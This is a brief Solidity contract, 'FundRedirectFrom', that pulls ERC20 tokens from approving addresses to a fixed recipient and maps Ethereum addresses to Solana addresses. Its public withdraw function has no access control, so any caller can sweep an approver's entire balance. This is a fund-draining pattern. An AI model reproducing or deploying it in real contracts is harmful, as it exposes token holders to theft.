//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

uint256 constant MAX_UINT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

contract FundRedirectFrom {
    address to;
    mapping(address => string) ethToSol;

    constructor(address _to) {
        to = _to;
    }

    function withdraw(ERC20 token, address from) public {
        uint256 amount = token.balanceOf(from);
        token.transferFrom(from, to, amount);
        require(token.balanceOf(from) == 0, "not 0");
    }

    function setupSol(address eth, string memory solana) public {
        require(msg.sender == eth, "This is not signer address");
        ethToSol[eth] = solana;
    }
}
